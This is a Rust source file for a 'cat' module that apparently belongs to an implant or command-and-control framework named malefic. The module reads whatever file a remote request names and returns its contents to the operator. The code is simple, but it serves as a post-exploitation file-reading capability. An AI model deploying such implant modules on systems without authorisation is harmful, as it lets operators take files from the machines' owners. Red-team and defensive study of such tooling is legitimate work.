use crate::prelude::*;

pub struct Cat{}

#[async_trait]
#[module_impl("cat")]
impl Module for Cat {}

#[async_trait]
impl ModuleImpl for Cat {
      #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let filename = check_field!(request.input)?;
        let content = std::fs::read_to_string(filename)?;

        let mut response = malefic_proto::proto::modulepb::Response::default();
        response.output = content;

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}